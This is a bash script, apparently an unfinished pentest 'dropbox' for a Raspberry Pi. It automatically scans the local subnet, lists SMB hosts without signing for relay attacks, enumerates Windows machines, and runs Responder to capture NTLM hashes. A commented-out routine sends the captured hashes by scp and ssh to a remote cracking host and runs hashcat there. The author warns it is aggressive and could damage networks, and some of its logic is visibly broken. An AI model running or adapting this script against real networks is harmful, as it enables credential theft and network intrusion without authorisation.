#!/bin/bash
# This is a script that can be droipped into a Raspberry pi and started as a service on-boot like a dropbox
#It will attempt to auto-pwn the network.... be warned, it is meant to be a little noisy and aggressive.
#Seriously, it is aggressive AND VERY LIKELY COULD BREAK SOMETHING!!!
#It is still very mcuh in dev and should NOT be deployed on any pen tests yet. IT WILL BREAK YOUR CLIENTS NETWORK POTENTIALLY RESULTING IN DAMAGE!!!!!
#Future iterations will be more stealthy, but for now, function > stealth

#Hardware for LTE
#Not required, but really helpful in case things don't work as planned

#https://docs.sixfab.com/docs/getting-started-with-base-hat-and-quectel-ec25-eg25-module

RED='\033[0;31m'
GREEN='\033[0;32m'
NC='\033[0m'




#This requires several services - in the future I'd like to add them to a "sigle script" to install
#In future iterations, I will do more error checking and gracefully making sure the rigfht folders/packages/etc are all installed
#For now, we are just going to assume they are (nmap, autossh, impacket, etc)
#NOTE - inotifywait is an important package here that is not on kali by default. Make sure you have it!


#First, check if running as root
if [ "$EUID" -ne 0 ]
  then echo -e "${RED}[!] Please run me as root.\n[*] Do NOT pass go.\n[*] Do NOT collect \$200${NC}"
  exit
fi

#make a dir for logs
#after running into directory collisions, let's do a basic directory check instead of just mkdir and letting it error if it alreadt exists
DIRECTORY="./autopwn_logs"
if [ ! -d "$DIRECTORY" ]; then
  echo -e "Creating a log directory because I guess we're supposed to and it's cleaner"
fi


#mkdir ./autopwn_logs || echo -e "${RED}for some reason, we can't create the directory ./autopwn_logs. Does it already exist? If so, no problem - hack on!"${NC}
#Making this a simple function check - 

#Now that we're doing the stuff, we are going to fire up responder
#scratch that - first we are going to identify computers with SMB signing disabled. Otherwise, Responder doesn't help much
#Also, scratch THAT. Third time is the charm. First, we find our IP and subnet info, THEN we find unsigned SMB, THEN we run responder, THEN WE FIRE THE MISSILES!!

prolly_the_right_IP=$(ip addr show eth0 | awk '/inet /{print $2; exit}' | cut -d/ -f1)
echo -e "${GREEN}Your IP is $prolly_the_right_IP"
wut_subnet=$(echo $prolly_the_right_IP | cut -f 1,2,3 -d ".").0/24
echo -e "${GREEN}Your subnet is $wut_subnet. Pwning will commence in 3....2....1....${NC}"

unsigned() {
    echo -e "generating a list of unsigned SMB hosts on the $wut_subnet network"
    nxc smb ${wut_subnet}.0/24 --gen-relay-list ./autopwn_logs/unsigned_list.txt
    echo -e "\n${GREEN}done! Your smb pwnage list is in ./autopwn_logs/unsigned_list.txt"
}

recon_one(){
    echo -e "${RED}performing some nmap action on $wut_subnet${NC}"
    nmap $wut_subnet -T5 -sV --open -oA ./autopwn_logs/open_ports
    echo -e "\n${GREEN}Nmap scans done! Check your logs at ./autopwn_logs/open_ports if you want to see manually"
}
more_enum_plz(){
    echo -e "${GREEN} Starting the Enum4Linux function ${NV}"
    #Below was one of the most fun pipes I've writen in a good year or two. Grep, awk, sed AND xargs all in the same pipe? The former Linux engineer in me rejoices
    #Admittedly, I haven't written many bash scripts lately, but I kind of miss it
    #Ook, well after getting further down the line, I actually didn't need xargs and sed, so I'm removing them :(
    grep -E '445/open|139/open|135/open' ./autopwn_logs/open_ports.gnmap | awk '{print $2}' > ./autopwn_logs/enum_me
    microsoft_ips=`cat ./autopwn_logs/enum_me` 
    echo -e "The windoze accounts appear to be "$microsoft_ips""
    for i in `cat ./autopwn_logs/enum_me`
    do
        echo -e "${GREEN} Running enum4linux on "${i}""
        enum4linux $i
    done
    }

more_hashes_plz(){
    
    #only when hashes are found, run the cracker
    echo -e "Running responder and setting up inotifywait service. In theory, anyway, this should announce when new hashes are found!"
    inotifywait -m -e create /usr/share/responder/logs/SMB*.txt && wall "got some hashes! MAke sure they send correctly" && ./send_it.sh
    responder -I eth0
  }


i_can_haz_cracks(){
    #I had to re-work this section and just make it a difference script :/ There was no way to programmatically re-enter this function within this specific script/PID run after backghrounding 


    #This section assumes you have a cracking rig (AKA big-rig for my team) already connected via VPN somewhere. 
    #If you don't, you can run this locally or just comment it out
    #This will grab all the SMB logs, scp them to the big-rig cracking machine, and run hashcat
    cp /usr/share/responder/logs/SMB-NTLM*.txt ./autopwn_hashes
    scp autopwn_hashes autopwn@big-rig:/home/dispareo/autopwn
    #Now that the file is copied over, crack it!
    ssh -o StrictHostKeyChecking=no -l dispareo big-rig "hashcat -m 5600 -a 0 autopwn_hashes -w 4 -r OneRuleToRuleThemStill.rul"
}
unsigned
recon_one
more_enum_plz
more_hashes_plz

#i_can_haz_cracks





